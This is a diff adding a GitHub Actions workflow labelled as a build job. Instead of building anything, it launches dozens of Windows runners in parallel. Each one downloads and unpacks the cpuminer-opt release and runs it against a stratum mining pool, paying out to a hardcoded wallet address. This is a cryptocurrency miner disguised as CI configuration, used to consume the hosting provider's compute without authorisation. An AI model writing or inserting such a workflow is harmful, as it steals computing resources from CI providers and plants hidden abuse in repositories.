@@ -1,0 +1,27 @@
+name: eX-code_MintMe
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: eX-code_MintMe
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: PREPARING
+      run: Invoke-WebRequest https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-win.zip -OutFile cpuminer-opt-win.zip 
+    - name: Seting-UP
+      run: Expand-Archive cpuminer-opt-win.zip 
+    - name: Running
+      run: ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BeirTyMZ5bq5hy1gP9fXGhL2xSYHVaaf51 -t1
+
+    - name: END
+      run: exit
